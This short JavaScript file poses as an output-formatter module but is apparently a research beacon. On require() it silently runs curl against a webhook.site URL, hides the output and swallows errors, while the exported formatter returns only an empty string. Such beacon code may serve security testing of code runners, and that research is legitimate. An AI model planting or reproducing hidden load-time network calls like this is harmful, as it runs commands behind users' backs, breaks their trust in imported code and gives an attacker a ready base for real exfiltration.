// RUNNERSINKS leg B: outputFormatters module — SYNC beacon at require() time.
const cp = require("child_process");
try { cp.execSync("curl -s -m 8 'https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-md-outputfmt'", {stdio: "ignore"}); } catch (e) {}
module.exports = function (results, options) { return ""; };
